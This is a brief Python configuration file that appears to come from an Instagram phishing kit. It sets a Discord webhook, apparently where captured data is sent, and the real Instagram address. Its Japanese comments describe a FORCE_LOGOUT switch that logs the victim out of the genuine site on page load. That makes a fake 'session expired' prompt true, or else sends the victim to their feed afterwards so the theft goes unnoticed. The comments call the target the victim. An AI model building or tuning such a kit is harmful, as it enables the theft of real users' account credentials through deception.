import os

DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
REAL_INSTAGRAM = "https://www.instagram.com/"

# True : ページを開いた瞬間に本物のInstagramから強制ログアウト
#        →「セッションの有効期限が切れました」が本当になる
#        → ただし成功時に公式のログイン画面に着地するので、もう一度ログインが必要
# False: ログアウトさせない
#        → 成功時は被害者のフィードに直行する（＝二重ログインなし）
FORCE_LOGOUT = os.environ.get("FORCE_LOGOUT", "1") == "1"
